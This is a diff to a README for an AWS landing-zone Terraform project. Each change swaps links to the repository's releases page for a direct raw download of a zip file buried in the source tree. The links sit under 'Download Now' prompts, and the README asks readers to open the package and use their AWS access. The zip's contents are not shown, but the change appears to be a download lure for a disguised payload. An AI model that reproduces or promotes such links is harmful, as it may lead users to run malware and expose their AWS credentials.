@@ -1,6 +1,6 @@
 # 🛡️ aws-landing-zone - Secure AWS Accounts with Terraform
 
-[![Download](https://img.shields.io/badge/Download%20%20Now-blue?style=for-the-badge&logo=github)](https://github.com/bilgy-watercraft652/aws-landing-zone/releases)
+[![Download](https://img.shields.io/badge/Download%20%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip)
 
 ## 🧭 What this is
 
@@ -29,7 +29,7 @@ If you plan to use Terraform files later, you may also want:
 
 Visit this page to download the release files:
 
-[https://github.com/bilgy-watercraft652/aws-landing-zone/releases](https://github.com/bilgy-watercraft652/aws-landing-zone/releases)
+[https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip](https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip)
 
 On the release page:
 
@@ -224,4 +224,4 @@ This repository focuses on:
 4. Follow the setup files in the package
 5. Use your AWS access to complete the landing zone setup
 
-[https://github.com/bilgy-watercraft652/aws-landing-zone/releases](https://github.com/bilgy-watercraft652/aws-landing-zone/releases)
+[https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip](https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip)
